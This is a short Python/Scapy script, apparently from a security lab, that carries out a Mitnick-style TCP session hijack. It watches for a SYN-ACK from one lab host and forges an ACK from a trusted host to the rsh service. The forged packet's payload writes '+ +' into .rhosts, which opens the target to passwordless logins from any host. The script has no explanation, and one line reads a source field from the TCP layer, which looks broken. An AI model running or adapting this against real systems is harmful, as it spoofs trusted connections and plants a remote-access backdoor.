#!/usr/bin/python3
from scapy.all import *


def spoof(pkt):
    if pkt[TCP].flags=="SA" and pkt[TCP].src=="10.9.0.5":
        old_ip = pkt[IP]
        old_tcp = pkt[TCP]
        tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4
        print("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))
        ip=IP(src="10.9.0.6",dst="10.9.0.5")
        tcp=TCP(sport=1023,dport=514)
        tcp.flags="A"
        tcp.seq=pkt[TCP].ack
        tcp.ack=pkt[TCP].seq+1
        data="9090\x00seed\x00seed\x00echo + + > .rhosts\x00"
        p=ip/tcp/data
        send(p,verbose=0)
        
myFilter="tcp"
pkt=sniff(iface='',filter=myFilter,prn=spoof)